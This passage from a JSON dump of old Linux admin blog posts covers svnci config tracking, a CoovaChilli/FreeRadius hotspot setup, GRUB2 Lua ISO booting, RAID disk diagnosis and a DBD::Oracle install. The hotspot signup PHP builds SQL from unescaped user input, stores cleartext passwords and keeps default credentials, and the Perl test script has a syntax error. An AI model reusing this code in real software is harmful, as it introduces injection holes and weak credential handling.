/root/configuration-gate/etc/cron.monthly/standard Deleting root/configuration-gate/etc/cron.monthly/debsums Deleting root/configuration-gate/etc/cron.monthly/standard Sending root/configuration-gate/files Transmitting file data . Committed revision 39. For updating files included in your repository you can use svnci -u command. It’s also handy to run it every night by cron to automatically track changes in your “monitored” files: gate:/etc# svnci -u Sending configuration-gate/etc/apache2/httpd.conf Sending configuration-gate/etc/apache2/sites-available/default-ssl Sending configuration-gate/etc/munin/plugin-conf.d/munin-node Sending configuration-gate/packages Sending configuration-gate/root/bin/files Transmitting file data ............. Committed revision 45. Enjoy :-)" }, { "title": "Debian Wi-Fi hotspot using CoovaChilli, FreeRadius, MySQL and daloRADIUS", "url": "/posts/debian-wi-fi-hotspot-using-coovachilli-freeradius-mysql-and-daloradius/", "categories": "Linux, Networking, linux-old.xvx.cz", "tags": "wifi, hotspot, database", "date": "2010-03-24 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2010/03/debian-wi-fi-hotspot-using-coovachilli-freeradius-mysql-and-daloradius/ I decided to create a hotspot from my server to allow others to connect to the Internet for free. I used Captive portal solution based on these applications: CoovaChilli FreeRadius MySQL daloRADIUS When somebody wants to connect to the Internet using my wifi, the first page they see is the register/login page (whatever page they want to visit). After registration/login they are able to connect to the Internet. So let’s see how I did it. Let’s have one server with two network interfaces - the first eth0 goes to the Internet, the second one eth1 is the wifi for “unknown” clients. Install basic software: aptitude install mysql-server phpmyadmin freeradius freeradius-utils freeradius-mysql apache2 php-pear php-db a2enmod ssl a2ensite default-ssl service apache2 restart cd /tmp &amp;&amp; wget 'http://downloads.sourceforge.net/project/daloradius/daloradius/daloradius-0.9-8/daloradius-0.9-8.tar.gz' tar xvzf daloradius-0.9-8.tar.gz mv /tmp/daloradius-0.9-8 /var/www/daloradius chown -R www-data:www-data /var/www/daloradius cp -r /var/www/daloradius/contrib/chilli/portal2/* /var/www/ rm /var/www/index.html Because my machine is 64-bit I needed to build the CoovaChilli package myself: aptitude --assume-yes install dpkg-dev debhelper libssl-dev cd /tmp || exit wget -c http://ap.coova.org/chilli/coova-chilli-1.2.2.tar.gz tar xzf coova-chilli*.tar.gz cd coova-chilli* || exit dpkg-buildpackage -rfakeroot Install CoovaChilli: cd .. || exit dpkg -i coova-chilli_*_amd64.deb Configure FreeRadius Change /etc/freeradius/clients.conf: client 127.0.0.1 { secret = mysecret } Change /etc/freeradius/sql.conf: server = \"localhost\" login = \"root\" password = \"xxxx\" Uncomment in /etc/freeradius/sites-available/default: authorize { sql } accounting { sql } Uncomment in /etc/freeradius/radiusd.conf: $INCLUDE sql.conf Configure MySQL database for FreeRadius mysql -u root --password=xxxx mysql&gt; CREATE DATABASE radius; mysql&gt; exit mysql -u root --password=xxxx radius &lt; /var/www/daloradius/contrib/db/fr2-mysql-daloradius-and-freeradius.sql daloRADIUS configuration Modify this file /var/www/daloradius/library/daloradius.conf.php $configValues['CONFIG_DB_PASS'] = 'xxxx'; $configValues['CONFIG_MAINT_TEST_USER_RADIUSSECRET'] = 'mysecret'; $configValues['CONFIG_DB_TBL_RADUSERGROUP'] = 'radusergroup'; You also need to modify following configuration files to setup sign in web pages /var/www/signup-*/library/daloradius.conf.php: $configValues['CONFIG_DB_PASS'] = 'xxxx'; $configValues['CONFIG_DB_NAME'] = 'radius'; $configValues['CONFIG_DB_TBL_RADUSERGROUP'] = 'radusergroup'; $configValues['CONFIG_SIGNUP_SUCCESS_MSG_LOGIN_LINK'] = \"Click &lt;b&gt;here&lt;/b&gt;\". \" to return to the Login page and start your surfing\"; Change lines in /var/www/signup*/index.php to (changed User-Password -&gt; Cleartext-Password and == -&gt; :=): $sql = \"INSERT INTO \".$configValues['CONFIG_DB_TBL_RADCHECK'].\" (id, Username, Attribute, op, Value) \". \" VALUES (0, '$username', 'Cleartext-Password', ':=', '$password')\"; Another file that needs to be modified to communicate with CoovaChilli is /var/www/hotspotlogin/hotspotlogin.php $uamsecret = \"uamsecret\"; Now you should be able to reach daloRADIUS installation on http://127.0.0.1/daloradius/ username: administrator password: radius Routing We should not forget to enable packet forwarding and setup NAT: iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE echo 1 &gt; /proc/sys/net/ipv4/ip_forward sed --in-place=.old 's/^#\\(net.ipv4.ip_forward=1\\)/\\1/' /etc/sysctl.conf sysctl -p CoovaChilli configuration Let’s start with /etc/chilli/defaults: HS_NETWORK=192.168.10.0 HS_UAMLISTEN=192.168.10.1 HS_RADSECRET=mysecret HS_UAMSECRET=uamsecret HS_UAMFORMAT=https://\\$HS_UAMLISTEN/hotspotlogin/hotspotlogin.php HS_UAMHOMEPAGE=https://\\$HS_UAMLISTEN Then don’t forget to enable CoovaChilli to start in /etc/default/chilli: START_CHILLI=1 Maybe you need to execute chilli and radius server with some debug options to see “errors” during client connection: chilli --fg --debug freeradius -X Few links we created: http://192.168.10.1/signup-free/ - sign up page (if you don’t have username/password) http://192.168.10.1:3990/prelogin - use for login to your portal http://192.168.10.1/daloradius/ - daloradius admin page http://192.168.10.1/phpmyadmin/ - phpmyadmin page (useful for sql database) This how-to describes a simple configuration of CoovaChilli so there are many things to configure. I didn’t mention anything about security - so it’s up to you to tweak it yourself. You can find additional info on this web page: https://help.ubuntu.com/community/WifiDocs/CoovaChilli Enjoy… ;-)" }, { "title": "Using Grub2 and LUA installed on USB booting ISO images", "url": "/posts/using-grub2-and-lua-installed-on-usb-booting-iso-images/", "categories": "Linux, linux-old.xvx.cz", "tags": "grub, pxe, debian", "date": "2010-03-23 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2010/03/using-grub2-and-lua-installed-on-usb-booting-iso-images-2/ I got 16 GB USB flash from my brother, because he can’t see me still using my old 64 MB. He decided to buy Imation Nano Flash Drive. Because many of my friends and colleagues are using Windows, I use NTFS on it. Old FAT is not “usable” in these days, because it can’t handle bigger files. From the first time I used USB disks I always wanted to have a bootable disk/flash with live CDs - so here are a few notes on how to create a USB flash drive able to boot stored live CDs: First you need to compile grub2 yourself, because default grub2 installations in distributions do not have LUA support: aptitude install autogen automake bison flex gettext gcc autoconf ruby bzr libfreetype6-dev Debian way compilation and installation: aptitude install dpkg-dev fakeroot apt-get source grub2 apt-get build-dep grub2 dpkg-source -x grub2_1.98-1.dsc bzr branch http://bzr.savannah.gnu.org/r/grub-extras/lua ./grub2-1.98/debian/grub-extras/lua ( cd grub2-1.98 || exit dpkg-buildpackage -rfakeroot -b ) dpkg -r grub-pc grub-common dpkg -i ./grub-common_1.98-1_amd64.deb ./grub-pc_1.98-1_amd64.deb Compilation and installation from source code (not necessary if you follow “Debian steps” above): bzr branch http://bzr.savannah.gnu.org/r/grub/trunk/grub mkdir ./grub/grub-extras bzr branch http://bzr.savannah.gnu.org/r/grub-extras/lua ./grub/grub-extras/lua #bzr branch http://bzr.savannah.gnu.org/r/grub-extras/gpxe ./grub/grub-extras/gpxe ( cd grub || exit export GRUB_CONTRIB=./grub-extras/ ./autogen.sh ./configure --prefix=/tmp/grub make make install ) Mount USB to some directory (in my case /mnt/sdb1) and install grub with Lua support on it: mount /dev/sdb1 /mnt/sdb1 grub-install --root-directory=/mnt/sdb1 /dev/sdb To make grub nicer, I add wallpaper and fonts to it: wget --directory-prefix=/tmp/ http://unifoundry.com/unifont-5.1.20080820.pcf.gz grub-mkfont --output=/mnt/sdb1/boot/grub/unifont.pf2 --range=0x0000-0x0241,0x2190-0x21FF,0x2500-0x259f /tmp/unifont-5.1.20080820.pcf.gz -v -b wget http://ubuntulife.files.wordpress.com/2007/05/linux.jpg /mnt/sdb1/boot/grub/ Last step is creating right configuration and downloading live iso images of various Linux distributions: Let’s download the ISOs first. It’s better to use most actual ones. These are working fine for me: mkdir -v /mnt/sdb1/isos wget -c --directory-prefix=/mnt/sdb1/isos \\ http://ftp.heanet.ie/pub/linuxmint.com/testing/LinuxMint-8-x64-RC1.iso \\ http://gd.tuwien.ac.at/opsys/linux/grml/grml64_2009.10.iso \\ http://ftp.cc.uoc.gr/mirrors/linux/slax/SLAX-6.x/slax-6.1.2.iso \\ http://downloads.sourceforge.net/project/systemrescuecd/sysresccd-x86/1.5.0/systemrescuecd-x86-1.5.0.iso \\ http://releases.ubuntu.com/karmic/ubuntu-9.10-desktop-amd64.iso \\ http://xpud.googlecode.com/files/xpud-0.9.2.iso The following code is taken from Ubuntu Forums where I added more live CDs. I also changed the main grub.cfg a little bit and use 64 live CDs amd64. Save following text as 3 files: /mnt/sdb1/boot/grub/grub.cfg: insmod vbeinfo insmod font if loadfont /boot/grub/unifont.pf2; then set gfxmode=\"1024x768x32,800x600x32,640x480x32,1024x768,800x600,640x480\" # set gfxpayload=keep insmod gfxterm # insmod vbe if terminal_output gfxterm; then true ; else terminal gfxterm fi fi insmod jpeg if background_image /boot/grub/linux.jpg; then set menu_color_normal=black/black set color_highlight=red/blue else set menu_color_normal=cyan/blue set menu_color_highlight=white/blue fi set default=0 set timeout=10 # Uncomment for a different ISO files search path #set isofolder=\"/boot/isos\" #export isofolder # Uncomment for a different live system language #set isolangcode=\"us\" #export isolangcode source /boot/grub/listisos.lua /mnt/sdb1/boot/grub/bootiso.lua: #!lua -- Detects the live system type and boots it function boot_iso (isofile, langcode) -- grml if (dir_exist (\"(loop)/boot/grml64\")) then boot_linux ( \"(loop)/boot/grml64/linux26\", \"(loop)/boot/grml64/initrd.gz\", \"findiso=\" .. isofile .. \" apm=power-off quiet boot=live nomce\" ) -- Parted Magic elseif (dir_exist (\"(loop)/pmagic\")) then boot_linux ( \"(loop)/pmagic/bzImage\", \"(loop)/pmagic/initramfs\", \"iso_filename=\" .. isofile .. \" edd=off noapic load_ramdisk=1 prompt_ramdisk=0 rw\" .. \" sleep=10 loglevel=0 keymap=\" .. langcode ) -- Sidux elseif (dir_exist (\"(loop)/sidux\")) then boot_linux ( find_file (\"(loop)/boot\", \"vmlinuz%-.*%-sidux%-.*\"), find_file (\"(loop)/boot\", \"initrd%.img%-.*%-sidux%-.*\"), \"fromiso=\" .. isofile .. \" boot=fll quiet\" ) -- Slax elseif (dir_exist (\"(loop)/slax\")) then boot_linux ( \"(loop)/boot/vmlinuz\", \"(loop)/boot/initrd.gz\", \"from=\" .. isofile .. \" ramdisk_size=6666 root=/dev/ram0 rw\" ) -- SystemRescueCd elseif (grub.file_exist (\"(loop)/isolinux/rescue64\")) then boot_linux ( \"(loop)/isolinux/rescue64\", \"(loop)/isolinux/initram.igz\", \"isoloop=\" .. isofile .. \" docache rootpass=xxxx setkmap=\" .. langcode ) -- Tinycore elseif (grub.file_exist (\"(loop)/boot/tinycore.gz\")) then boot_linux ( \"(loop)/boot/bzImage\", \"(loop)/boot/tinycore.gz\" ) -- Ubuntu and Casper based Distros elseif (dir_exist (\"(loop)/casper\")) then boot_linux ( \"(loop)/casper/vmlinuz\", find_file (\"(loop)/casper\", \"initrd%..z\"), \"boot=casper iso-scan/filename=\" .. isofile .. \" quiet splash noprompt\" .. \" keyb=\" .. langcode .. \" debian-installer/language=\" .. langcode .. \" console-setup/layoutcode?=\" .. langcode .. \" --\" ) -- Xpud elseif (grub.file_exist (\"(loop)/boot/xpud\")) then boot_linux ( \"(loop)/boot/xpud\", \"(loop)/opt/media\" ) else print_error (\"Unsupported ISO type\") end end -- Help function to show an error function print_error (msg) print (\"Error: \" .. msg) grub.run (\"read\") end -- Help function to search for a file function find_file (folder, match) local filename local function enum_file (name) if (filename == nil) then filename = string.match (name, match) end end grub.enum_file (enum_file, folder) if (filename) then return folder .. \"/\" .. filename else return nil end end -- Help function to check if a directory exist function dir_exist (dir) return (grub.run(\"test -d '\" .. dir .. \"'\") == 0) end -- Boots a Linux live system function boot_linux (linux, initrd, params) if (linux and grub.file_exist (linux)) then if (initrd and grub.file_exist (initrd)) then if (params) then grub.run (\"linux \" .. linux .. \" \" .. params) else grub.run (\"linux \" .. linux) end grub.run (\"initrd \" .. initrd) else print_error (\"Booting Linux failed: cannot find initrd file '\" .. initrd .. \"'\") end else print_error (\"Booting Linux failed: cannot find linux file '\" .. initrd .. \"'\") end end -- Mounts the iso file function mount_iso (isofile) local result = false if (isofile == nil) then print_error (\"variable 'isofile' is undefined\") elseif (not grub.file_exist (isofile)) then print_error (\"Cannot find isofile '\" .. isofile .. \"'\") else local err_no, err_msg = grub.run (\"loopback loop \" .. isofile) if (err_no ~= 0) then print_error (\"Cannot load ISO: \" .. err_msg) else result = true end end return result end -- Getting the environment parameters isofile = grub.getenv (\"isofile\") langcode = grub.getenv (\"isolangcode\") if (langcode == nil) then langcode = \"us\" end -- Mounting and booting the live system if (mount_iso (isofile)) then boot_iso (isofile, langcode) end /mnt/sdb1/boot/grub/listisos.lua: #!lua isofolder = grub.getenv (\"isofolder\") if (isofolder == nil) then isofolder = \"/isos\" end function enum_file (name) local title = string.match (name, \"(.*)%.[iI][sS][oO]\") if (title) then local source = \"set isofile=\" .. isofolder .. \"/\" .. name .. \"\\nsource /boot/grub/bootiso.lua\" grub.add_menu (source, title) end end grub.enum_file (enum_file, isofolder) UPDATE: In the new grub versions I had to modify following lines (from source -&gt; lua and one module name vbeinfo -&gt; vbe) otherwise it was not running correctly. Please look at these lines and change it in the scripts above: insmod vbe lua /boot/grub/listisos.lua \"\\nlua /boot/grub/bootiso.lua\" After unmounting your USB flash should be bootable and you should get menu similar to this one: Enjoy :-)" }, { "title": "RAID disk check in Linux", "url": "/posts/raid-disk-check-in-linux/", "categories": "Linux, Storage, linux-old.xvx.cz", "tags": "raid, storage", "date": "2010-03-23 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2010/03/raid-disk-check-in-linux/ One day I checked dmesg from one of my servers and I saw I/O errors :-( gate:~ dmesg ... [ 4220.798665] ide: failed opcode was: unknown [ 4220.798665] end_request: I/O error, dev hda, sector 21067462 [ 4222.983683] hda: dma_intr: status=0x51 { DriveReady SeekComplete Error } [ 4222.983683] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=21067572, sector=21067470 ... Luckily for me there are two disks in RAID 1 so my data was not lost. The machine is “just” a firewall, so I decided to play a little bit with the bad hard disk, because there are no important data on it. Usually if you see errors like I mentioned above you replace the disk without any questions, but I would like to “get” some outputs from diagnostic commands. So you can see what you can do in such a case. S.M.A.R.T checks The drives are pretty old, so it’s better to check if they support S.M.A.R.T. and if it’s enabled: gate:~ smartctl -i /dev/hda | grep 'SMART support' SMART support is: Available - device has SMART capability. SMART support is: Enabled Let’s check some information about the disk. You can see - it’s quite old: gate:~ smartctl --attributes /dev/hda === START OF READ SMART DATA SECTION === SMART Attributes Data Structure revision number: 16 Vendor Specific SMART Attributes with Thresholds: ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE 3 Spin_Up_Time 0x0027 235 234 063 Pre-fail Always - 5039 4 Start_Stop_Count 0x0032 253 253 000 Old_age Always - 969 5 Reallocated_Sector_Ct 0x0033 253 251 063 Pre-fail Always - 2 6 Read_Channel_Margin 0x0001 253 253 100 Pre-fail Offline - 0 7 Seek_Error_Rate 0x000a 253 252 000 Old_age Always - 0 8 Seek_Time_Performance 0x0027 247 231 187 Pre-fail Always - 33044 9 Power_On_Minutes 0x0032 247 247 000 Old_age Always - 148h+27m 10 Spin_Retry_Count 0x002b 253 252 223 Pre-fail Always - 0 11 Calibration_Retry_Count 0x002b 253 252 223 Pre-fail Always - 0 12 Power_Cycle_Count 0x0032 251 251 000 Old_age Always - 973 192 Power-Off_Retract_Count 0x0032 253 253 000 Old_age Always - 842 193 Load_Cycle_Count 0x0032 253 253 000 Old_age Always - 3829 194 Unknown_Attribute 0x0032 253 253 000 Old_age Always - 0 195 Hardware_ECC_Recovered 0x000a 253 248 000 Old_age Always - 6580 196 Reallocated_Event_Count 0x0008 240 240 000 Old_age Offline - 13 197 Current_Pending_Sector 0x0008 251 247 000 Old_age Offline - 2 198 Offline_Uncorrectable 0x0008 253 242 000 Old_age Offline - 0 199 UDMA_CRC_Error_Count 0x0008 199 199 000 Old_age Offline - 0 200 Multi_Zone_Error_Rate 0x000a 253 252 000 Old_age Always - 0 201 Soft_Read_Error_Rate 0x000a 253 218 000 Old_age Always - 2 202 TA_Increase_Count 0x000a 253 001 000 Old_age Always - 0 203 Run_Out_Cancel 0x000b 253 096 180 Pre-fail Always In_the_past 382 204 Shock_Count_Write_Opern 0x000a 253 151 000 Old_age Always - 0 205 Shock_Rate_Write_Opern 0x000a 253 252 000 Old_age Always - 0 207 Spin_High_Current 0x002a 253 252 000 Old_age Always - 0 208 Spin_Buzz 0x002a 253 252 000 Old_age Always - 0 209 Offline_Seek_Performnce 0x0024 189 182 000 Old_age Offline - 0 99 Unknown_Attribute 0x0004 253 253 000 Old_age Offline - 0 100 Unknown_Attribute 0x0004 253 253 000 Old_age Offline - 0 101 Unknown_Attribute 0x0004 253 253 000 Old_age Offline - 0 The basic S.M.A.R.T. test shows there is a problem on the disk: gate:~ smartctl --health /dev/hda === START OF READ SMART DATA SECTION === SMART overall-health self-assessment test result: PASSED Please note the following marginal Attributes: ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE 203 Run_Out_Cancel 0x000b 253 096 180 Pre-fail Always In_the_past 24 Let’s run the “short” test to do quick test of the disk: gate:~ smartctl -t short /dev/hda === START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION === Sending command: \"Execute SMART Short self-test routine immediately in off-line mode\". Drive command \"Execute SMART Short self-test routine immediately in off-line mode\" successful. Testing has begun. Please wait 2 minutes for test to complete. Test will complete after Thu Mar 18 13:10:57 2010 Use smartctl -X to abort test. Here are the results from the previous test: gate:~ smartctl -l selftest /dev/hda === START OF READ SMART DATA SECTION === SMART Self-test log structure revision number 1 Num Test_Description Status Remaining LifeTime(hours) LBA_of_first_error # 1 Short offline Completed without error 00% 2187 - # 2 Short offline Completed without error 00% 469 - # 3 Short offline Completed without error 00% 469 - # 4 Short offline Completed without error 00% 469 - # 5 Short offline Completed without error 00% 469 - # 6 Short offline Completed without error 00% 469 - # 7 Short offline Completed without error 00% 469 - # 8 Short offline Completed without error 00% 469 - # 9 Short offline Completed without error 00% 469 - #10 Short offline Completed without error 00% 469 - #11 Short offline Completed without error 00% 469 - #12 Short offline Completed without error 00% 469 - #13 Short offline Completed without error 00% 469 - #14 Short offline Completed without error 00% 469 - #15 Short offline Completed without error 00% 469 - #16 Short offline Completed without error 00% 469 - #17 Short offline Completed without error 00% 469 - #18 Short offline Completed without error 00% 469 - #19 Short offline Completed without error 00% 469 - #20 Short offline Completed without error 00% 469 - #21 Short offline Completed without error 00% 469 - Looks like short test doesn’t tell much about errors. Run “long” one: gate:~ smartctl -t long /dev/hda === START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION === Sending command: \"Execute SMART Extended self-test routine immediately in off-line mode\". Drive command \"Execute SMART Extended self-test routine immediately in off-line mode\" successful. Testing has begun. Please wait 13 minutes for test to complete. Test will complete after Thu Mar 18 13:24:25 2010 Use smartctl -X to abort test. The “long” test shows the errors: gate:~ smartctl -l selftest /dev/hda === START OF READ SMART DATA SECTION === SMART Self-test log structure revision number 1 Num Test_Description Status Remaining LifeTime(hours) LBA_of_first_error # 1 Short offline Completed: read failure 60% 2187 12678904 # 2 Extended offline Completed: read failure 30% 2187 12678904 # 3 Short offline Completed: read failure 60% 2187 12678901 # 4 Extended offline Completed: read failure 30% 2187 12678904 # 5 Short offline Completed without error 00% 2187 - # 6 Short offline Completed without error 00% 469 - # 7 Short offline Completed without error 00% 469 - # 8 Short offline Completed without error 00% 469 - # 9 Short offline Completed without error 00% 469 - #10 Short offline Completed without error 00% 469 - #11 Short offline Completed without error 00% 469 - #12 Short offline Completed without error 00% 469 - #13 Short offline Completed without error 00% 469 - #14 Short offline Completed without error 00% 469 - #15 Short offline Completed without error 00% 469 - #16 Short offline Completed without error 00% 469 - #17 Short offline Completed without error 00% 469 - #18 Short offline Completed without error 00% 469 - #19 Short offline Completed without error 00% 469 - #20 Short offline Completed without error 00% 469 - #21 Short offline Completed without error 00% 469 - See all previous errors: gate:~ smartctl --attributes --log=selftest --quietmode=errorsonly /dev/hda ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE 203 Run_Out_Cancel 0x000b 253 096 180 Pre-fail Always In_the_past 66 Num Test_Description Status Remaining LifeTime(hours) LBA_of_first_error # 1 Short offline Completed: read failure 60% 2187 12678901 # 2 Extended offline Completed: read failure 30% 2187 12678904 gate:~ smartctl --log=error --quietmode=errorsonly /dev/hda ATA Error Count: 2105 (device log contains only the most recent five errors) Error 2105 occurred at disk power-on lifetime: 2188 hours (91 days + 4 hours) Error 2104 occurred at disk power-on lifetime: 2188 hours (91 days + 4 hours) Error 2103 occurred at disk power-on lifetime: 2188 hours (91 days + 4 hours) Error 2102 occurred at disk power-on lifetime: 2188 hours (91 days + 4 hours) Error 2101 occurred at disk power-on lifetime: 2188 hours (91 days + 4 hours) Bad block test You can see the errors also in the syslog: gate:~ grep LBA /var/log/messages ... Mar 18 08:34:01 gate kernel: [ 74.222868] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=4518804, sector=4518798 Mar 18 08:35:08 gate kernel: [ 198.366248] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=16327415, sector=16327414 Mar 18 08:35:10 gate kernel: [ 200.543912] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=16327415, sector=16327414 Mar 18 08:36:18 gate kernel: [ 268.565562] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=16298535, sector=16298534 Mar 18 08:36:20 gate kernel: [ 270.662356] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=16298535, sector=16298534 Mar 18 08:37:15 gate kernel: [ 325.463500] hda: dma_intr: error=0x01 { AddrMarkNotFound }, LBAsect=16285168, sector=16285166 Mar 18 08:37:44 gate kernel: [ 354.873957] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=3503880, sector=3503878 Mar 18 08:37:49 gate kernel: [ 359.932012] hda: dma_intr: error=0x40 { UncorrectableError }, LBAsect=3503880, sector=3503878 ... Use badblocks check as the last, because it’s time consuming: gate:~ time badblocks -s -v -o /tmp/bad_blocks /dev/hda Checking blocks 0 to 19938239 Checking for bad blocks (read-only test): done Pass completed, 5 bad blocks found. real 163m59.908s user 0m3.712s sys 0m48.583s gate:~ cat /tmp/bad_blocks 6601216 6601592 8043696 8149160 10533408 badblocks and S.M.A.R.T show errors so it’s pretty clear, that that disk needs to be replaced asap. The commands I used before tested disk from “hardware” level. Because there is a RAID 1 in place it was nice opportunity to see what was happening on “software” level. RAID checks Here is the fdisk output for both disks: gate:~ fdisk -l /dev/hda /dev/hdc Disk /dev/hda: 20.4 GB, 20416757760 bytes 255 heads, 63 sectors/track, 2482 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Disk identifier: 0x00051324 Device Boot Start End Blocks Id System /dev/hda1 1 6 48163+ fd Linux raid autodetect /dev/hda2 7 2482 19888470 fd Linux raid autodetect Disk /dev/hdc: 20.4 GB, 20416757760 bytes 255 heads, 63 sectors/track, 2482 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Disk identifier: 0x0006e1d1 Device Boot Start End Blocks Id System /dev/hdc1 1 6 48163+ fd Linux raid autodetect /dev/hdc2 7 2482 19888470 fd Linux raid autodetect Before I began to do any high disk utilization operations, it was good to check used max speed for RAID check. If I had this value “higher” it could really slow down the server. 1 MB/s is enough for my old disks: gate:~ echo 1000 &gt; /proc/sys/dev/raid/speed_limit_max gate:~ cat /etc/sysctl.conf ... # RAID rebuild min/max speed K/Sec per device dev.raid.speed_limit_min = 100 dev.raid.speed_limit_max = 1000 Start disk check: gate:~ /usr/share/mdadm/checkarray --all checkarray: I: check queued for array md0. checkarray: I: check queued for array md1. gate:~ cat /proc/mdstat Personalities : [raid1] md1 : active raid1 hda2[0] hdc2[1] 19888384 blocks [2/2] [UU] resync=DELAYED md0 : active raid1 hda1[0] hdc1[1] 48064 blocks [2/2] [UU] [======&gt;..............] check = 31.9% (16000/48064) finish=0.4min speed=1066K/sec unused devices: &lt;none&gt; gate:~ dmesg ... [41674.362333] md: data-check of RAID array md0 [41674.362399] md: minimum _guaranteed_ speed: 100 KB/sec/disk. [41674.362447] md: using maximum available idle IO bandwidth (but not more than 1000 KB/sec) for data-check. [41674.362532] md: using 128k window, over a total of 48064 blocks. [41674.385200] md: delaying data-check of md1 until md0 has finished (they share one or more physical units) [41721.793276] md: md0: data-check done. [41721.851857] md: data-check of RAID array md1 [41721.852088] md: minimum _guaranteed_ speed: 100 KB/sec/disk. [41721.852140] md: using maximum available idle IO bandwidth (but not more than 1000 KB/sec) for data-check. [41721.852226] md: using 128k window, over a total of 19888384 blocks. [41721.856334] RAID1 conf printout: [41721.856395] --- wd:2 rd:2 [41721.856439] disk 0, wo:0, o:1, dev:hda1 [41721.856484] disk 1, wo:0, o:1, dev:hdc1 [65191.893316] md: md1: data-check done. [65192.158680] RAID1 conf printout: [65192.158745] --- wd:2 rd:2 [65192.158787] disk 0, wo:0, o:1, dev:hda2 [65192.158829] disk 1, wo:0, o:1, dev:hdc2 ... &lt;/none&gt; To my surprise mdadm didn’t find any errors :-( Disk replacement The disk needed to be replaced by the new one. First I had to mark it as failed: gate:~ mdadm --manage /dev/md0 --fail /dev/hda1 mdadm: set /dev/hda1 faulty in /dev/md0 gate:~ cat /proc/mdstat Personalities : [raid1] md1 : active raid1 hda2[0] hdc2[1] 19888384 blocks [2/2] [UU] md0 : active raid1 hda1[2](F) hdc1[1] 48064 blocks [2/1] [_U] unused devices: &lt;none&gt; &lt;/none&gt; Then I removed it from /dev/md0: gate:~ mdadm --manage /dev/md0 --remove /dev/hda1 mdadm: hot removed /dev/hda1 Dmesg: gate:~ dmesg ... [142783.600283] raid1: Disk failure on hda1, disabling device. [142783.600294] raid1: Operation continuing on 1 devices. [142783.624888] RAID1 conf printout: [142783.624947] --- wd:1 rd:2 [142783.624986] disk 0, wo:1, o:0, dev:hda1 [142783.625029] disk 1, wo:0, o:1, dev:hdc1 [142783.636136] RAID1 conf printout: [142783.636203] --- wd:1 rd:2 [142783.636245] disk 1, wo:0, o:1, dev:hdc1 [142905.796896] md: unbind&lt;hda1&gt; [142905.796988] md: export_rdev(hda1) ... &lt;/hda1&gt; I had to do the same procedure for md1: gate:~ mdadm --manage /dev/md1 --fail /dev/hda2 mdadm: set /dev/hda2 faulty in /dev/md1 gate:~ mdadm --manage /dev/md1 --remove /dev/hda2 mdadm: hot removed /dev/hda2 Warning email from mdadm was sent: Subject: Fail event on /dev/md0:gate This is an automatically generated mail message from mdadm running on gate A Fail event had been detected on md device /dev/md0. It could be related to component device /dev/hda1. After disk change A new disk was installed, OS was up and running - it’s time to check bad sectors on the new one: time badblocks -s -v -w -o /var/tmp/bad_blocks /dev/hda I needed to have the same partitions on the new “clean” disk as on the old one. The easiest way is to use sfdisk: sfdisk -d /dev/hdc | sfdisk --force /dev/hda Added the partitions to the RAID: mdadm --manage /dev/md0 --add /dev/hda1 mdadm --manage /dev/md1 --add /dev/hda2 The last step is installing GRUB to the MBR of the new disk. If you forget about it, then you will not be able to boot from the “new” hda disk if the “old” disk hdc fails. gate:~ grub root (hd0,0) setup (hd0) You can find a lot of great tips regarding “bad sectors” on this page." }, { "title": "Perl Oracle client manual installation to home directory in Debian", "url": "/posts/perl-oracle-client-manual-installation-to-home-directory-in-debian/", "categories": "Linux, Storage, linux-old.xvx.cz", "tags": "database, debian", "date": "2010-03-17 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2010/03/perl-oracle-client-manual-installation-to-home-directory-in-debian/ I needed to connect to the Oracle database at my work to get some data from it. I’m not an Oracle expert, but I decided to use DBD::Oracle. Most of the manuals and how-to pages describe how to install client libraries to the system (usually as root), which was not my case. I just need one directory with libraries in my $HOME and a few scripts to get some data from the database - no system installations. Here are the steps to install DBD-Oracle and its libraries to “one” directory without making a mess in the system: First let’s install the core system-related libraries and tools: aptitude install gcc libdbi-perl libaio1 libstdc++6-4.4-dev unzip Get the Oracle client libraries from the Oracle Instant Client download page: mkdir \"${HOME}/lib/\" &amp;&amp; cd \"${HOME}/lib/\" || exit wget basiclite-11.1.0.7.0-linux-x86_64.zip sqlplus-11.1.0.7.0-linux-x86_64.zip sdk-11.1.0.7.0-linux-x86_64.zip unzip ./*.zip Install DBD::Oracle: wget http://search.cpan.org/CPAN/authors/id/P/PY/PYTHIAN/DBD-Oracle-1.24a.tar.gz tar xvzf DBD-Oracle*.tar.gz cd DBD-Oracle* || exit export LD_LIBRARY_PATH=\"${HOME}/lib/instantclient_11_1\" export C_INCLUDE_PATH=\"${HOME}/lib/instantclient_11_1/sdk/include\" perl Makefile.PL PREFIX=\"${HOME}/lib\" make &amp;&amp; make install Now you should have DBD::Oracle installed in your $HOME/lib directory. You can modify this short script to see if it’s really working: #!/usr/bin/perl -w use DBI; push (@INC,\"$ENV{'HOME'}/lib/lib/perl/5.10.1\"); $host=\"myhost\"; $user=\"ORACLEUSER\"; $passwd='MYPASS'; #tnsping #lsnrctl services - to find the right SID $dbh = DBI-&gt;connect(\"dbi:Oracle:host=$host;sid=ORCH3;port=1521\", $user, $passwd); or die \"Couldn't connect to database: \" . DBI-&gt;errstr; my $sth = $dbh-&gt;prepare(\"select * from tab\") or die \"Couldn't prepare statement: \" . $dbh-&gt;errstr; $sth-&gt;execute() or die \"Couldn't execute statement: \" . $sth-&gt;errstr; while (my ($table_name) = $sth-&gt;fetchrow_array()) { print $table_name, \"\\n\"; } $sth-&gt;finish(); $dbh-&gt;disconnect(); I believe you can install DBD::Oracle without the dependencies above like gcc or libstdc++, but I’m fine with installing these." }, { "title": 